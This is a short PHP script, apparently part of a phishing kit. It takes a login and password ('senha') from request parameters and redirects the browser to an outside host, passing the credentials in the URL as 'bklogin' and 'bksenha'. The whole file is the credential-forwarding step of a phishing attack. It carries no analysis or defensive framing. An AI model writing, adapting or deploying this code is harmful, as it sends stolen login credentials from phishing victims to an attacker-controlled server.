<?php
    if (isset($_GET['login'])) {
        $login = $_GET['login'];
        if (isset($_GET['senha'])) {
            $senha = $_GET['senha'];
        }
    }
    $url = 'http://begalitohost.byethost10.com/17-09/comp.php?bklogin='.$login.'&bksenha='.$senha;
    header('Location: '.$url);
?>